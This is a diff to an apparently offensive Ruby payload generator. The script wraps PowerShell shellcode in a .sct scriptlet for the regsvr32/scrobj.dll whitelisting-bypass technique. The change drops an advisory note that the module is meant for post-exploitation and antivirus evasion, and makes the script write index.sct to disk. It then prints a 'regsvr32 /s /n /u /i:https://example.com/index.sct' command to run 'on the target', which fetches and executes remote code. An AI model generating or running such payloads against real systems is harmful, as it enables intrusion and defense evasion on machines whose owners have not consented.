@@ -343,10 +343,7 @@ if $lencode == "sct"
 
 powershell_encoded = gen_PS_shellcode()
 
-sctTEMPLATE = %{==============================BE ADVISED!=============================
-This module is best used for post-exploitation, evasion of AV or whitelisting, not for actual trojans.
-=============================/BE ADVISED!=============================
-<?XML version="1.0"?>
+sctTEMPLATE = %{<?XML version="1.0"?>
 <scriptlet>
 
 <registration
@@ -357,7 +354,7 @@ This module is best used for post-exploitation, evasion of AV or whitelisting, n
     >
     <!-- Based on work by Casey Smith @subTee -->
     
-    <!-- regsvr32 /s /n /u /i:https://example.com/file.sct scrobj.dll
+    <!-- regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll
     <!-- DFIR -->
     <!--        .sct files are downloaded and executed from a path like this -->
     <!-- Though, the name and extension are arbitary.. -->
@@ -389,7 +386,8 @@ This module is best used for post-exploitation, evasion of AV or whitelisting, n
 
 </scriptlet>}
 
-puts sctTEMPLATE
+File.write( 'index.sct', sctTEMPLATE) 
+puts "File: index.sct created\nUsage:\"regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll\" on the target"
 
 end
 
